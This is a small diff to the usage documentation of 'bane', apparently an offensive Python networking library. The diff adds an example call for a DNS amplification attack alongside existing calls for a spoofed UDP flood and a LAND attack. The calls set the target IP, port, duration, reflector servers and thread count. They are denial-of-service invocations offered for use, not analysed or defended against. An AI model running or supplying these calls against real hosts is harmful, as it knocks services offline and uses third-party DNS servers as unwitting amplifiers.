@@ -151,3 +151,5 @@ II-Usage:
 <br>bane.spoofed_udp_flood(IP , p=port , duration= 300 , min_size=10 , max_size=20 , interval=0.1 , threads=50 , timeout=5 )
 <h4>LAND attack:</h4>
 <br>bane.land(IP , p=port , duration= 300 , min_size=10 , max_size=20 , interval=0.1 , threads=50 , timeout=5 )
+<h4>DNS amplification attack:</h4>
+<br>bane.dns_amplification(IP , p=port , duration= 300 , servers=[] , interval=0.1 , threads=50 , timeout=5 )
